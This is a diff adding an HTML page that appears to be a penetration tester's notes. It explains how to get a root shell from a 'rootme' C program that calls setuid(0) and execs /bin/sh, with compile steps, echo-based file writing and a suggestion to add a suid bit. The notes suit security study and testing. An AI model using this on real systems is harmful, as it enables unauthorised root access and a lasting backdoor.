@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Able to run files as root?</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Able to run files as root?</h1></strong><br />If you&#39;re able to run files as root, you&#39;re probably doing something crafty so you might have to be creative.<br /><br /><strong><h2>## Use a &#39;rootme&#39; binary</h2></strong><br />Here&#39;s a good &#39;rootme&#39; binary that will give you a root shell if the binary runs as root.<br /><br />Write it in /tmp:<br /><code>cd /tmp<br />nano rootme.c</code><br /><br /><div class="codebox"><div class="codebox">int&nbsp;main(void)<br />{<br />setgid(0);<br />setuid(0);<br />execl(&quot;/bin/sh&quot;,&nbsp;&quot;sh&quot;,&nbsp;0);<br />}</div></div><br /><br />Compile it:<br /><code>gcc rootme.c -o rootme</code><br /><br />You could also add a suid bit at this point if possible.<br /><br />If you don&#39;t have access to an interactive shell, you can echo the lines into a file:<br /><div class="codebox"><div class="codebox">echo&nbsp;&quot;int&nbsp;main(void)&quot;&nbsp;&gt;&nbsp;rootme.c<br />echo&nbsp;&quot;{&quot;&nbsp;&gt;&gt;&nbsp;rootme.c<br />echo&nbsp;&quot;setgid(0);&quot;&nbsp;&gt;&gt;&nbsp;rootme.c<br />echo&nbsp;&quot;setuid(0);&quot;&nbsp;&gt;&gt;&nbsp;rootme.c<br />echo&nbsp;&quot;execl(&#39;/bin/sh&#39;,&nbsp;&#39;sh&#39;,&nbsp;0);&quot;&nbsp;&gt;&gt;&nbsp;rootme.c<br />echo&nbsp;&quot;}&quot;&nbsp;&gt;&gt;&nbsp;rootme.c<br /></div></div><br /><code>&gt;</code> writes<br /><code>&gt;&gt;</code> appends<br /><br />And run the file.<br /><div class="codebox"><div class="codebox">./rootme</div></div></div>
+</body>
+</html>
